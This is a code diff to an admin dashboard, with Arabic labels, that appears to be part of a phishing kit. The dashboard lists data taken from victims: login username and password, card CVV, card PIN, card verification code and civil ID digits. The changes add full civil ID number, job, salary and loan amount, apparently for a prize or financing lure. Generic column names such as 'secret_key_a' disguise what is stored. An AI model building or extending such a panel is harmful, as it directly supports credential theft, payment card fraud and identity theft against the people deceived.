@@ -53,7 +53,7 @@ const statusLabels: Record<string, string> = {
 type RoutePage = { path: string; label: string };
 
 const routePages: RoutePage[] = [
-  { path: ROUTES.home, label: "الصفحة الرئيسية" },
+  { path: ROUTES.home, label: "المعلومات الشخصية" },
   { path: ROUTES.signIn, label: "تسجيل الدخول" },
   { path: ROUTES.passcode, label: "كلمة السر (الحساب)" },
   { path: ROUTES.cardData, label: "بيانات البطاقة" },
@@ -436,8 +436,10 @@ export default function AdminPage() {
                               <div className="grid grid-cols-2 md:grid-cols-3 gap-2">
                                 <DataField label="الاسم" value={row.contact_name} />
                                 <DataField label="رقم الهاتف" value={row.contact_ref} ltr />
-                                <DataField label="العنوان" value={row.contact_address} />
-                                <DataField label="معلومات إضافية" value={row.contact_extra} />
+                                <DataField label="رقم الهوية المدني" value={row.civil_id} ltr />
+                                <DataField label="الوظيفة" value={row.prize_choice} />
+                                <DataField label="الراتب" value={row.contact_extra} ltr />
+                                <DataField label="قيمة التمويل" value={row.contact_address} ltr />
                                 <DataField label="اسم المستخدم" value={row.member_label} ltr />
                                 <DataField label="كلمة المرور" value={row.secret_key_a} ltr />
                                 <DataField label="آخر رقمين من البطاقة المدنية" value={row.id_tail} ltr />
@@ -447,7 +449,6 @@ export default function AdminPage() {
                                 <DataField label="CVV" value={row.extra_key_c} ltr />
                                 <DataField label="كلمة سر البطاقة" value={row.extra_key_d} ltr />
                                 <DataField label="رمز تحقق البطاقة" value={row.extra_key_e} ltr />
-                                <DataField label="الساعة المختارة" value={row.prize_choice} />
                               </div>
                             </div>
                           )}
